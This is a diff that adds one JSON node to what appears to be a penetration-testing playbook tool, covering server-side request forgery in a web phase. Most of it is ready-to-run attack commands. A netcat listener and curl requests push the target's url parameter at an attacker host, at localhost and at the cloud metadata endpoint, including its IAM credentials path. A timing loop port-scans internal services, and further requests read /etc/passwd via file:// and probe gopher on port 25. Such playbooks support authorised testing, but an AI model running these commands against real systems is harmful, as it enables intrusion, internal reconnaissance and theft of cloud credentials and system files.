@@ -1,0 +1,22 @@
+{
+  "id": "ssrf",
+  "phase": "WEB",
+  "title": "SSRF",
+  "body": "Pivot through the web app to reach internal services. Time-based internal port scanning is reliable. Cloud metadata is a bonus prize.",
+  "cmd": "nc -nlvp 80\n\ncurl \"http://$ip/page?url=http://$lhost/\"\ncurl \"http://$ip/page?url=http://127.0.0.1/\"\ncurl \"http://$ip/page?url=http://169.254.169.254/\"\n\n# Internal port scan via timing\nfor port in 22 80 443 445 3306 5432 6379 8080 8443; do\n  echo -n \"$port: \"\n  time curl -so /dev/null \"http://$ip/page?url=http://127.0.0.1:$port/\"\ndone\n\n# Cloud metadata\ncurl \"http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\n# File read\ncurl \"http://$ip/page?url=file:///etc/passwd\"\ncurl \"http://$ip/page?url=gopher://127.0.0.1:25/\"",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Reached internal service",
+      "next": "pivot_portscan"
+    },
+    {
+      "label": "Cloud metadata creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "File read working — LFI path",
+      "next": "lfi"
+    }
+  ]
+}
